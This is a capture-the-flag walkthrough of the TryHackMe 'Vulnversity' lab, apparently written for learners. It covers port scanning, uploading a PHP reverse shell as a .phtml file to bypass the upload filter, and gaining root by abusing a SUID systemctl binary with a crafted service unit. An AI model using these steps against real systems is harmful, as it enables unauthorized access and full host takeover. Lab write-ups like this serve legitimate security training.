# TRYHACKME : Vulnversity
> **NOTE: Straightforward write-up.**

## NMAP 
```
Nmap -sC -A -v 10.x.x.x ###
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Vuln University
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

## Gobuster 
```
/images
/css
/js
/internal
```

## Burpsuite
```
file for bruteforce: phpext.txt
.phtml
download php-reverse-shell or /usr/share/webshells/php/php-reverse-shell.php
rename extension into .phtml
```

## Reverse Shell 
> Upload .phtml file within the /internal upload
```
whoami = bill
cat user.txt
```

## Privilege Escalation
```
find / -type f -perm -4000 2>/dev/null
note /bin/systemctl
(search from GTFOBins: systemctl)
paste:
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF

cat /root/root.txt
```
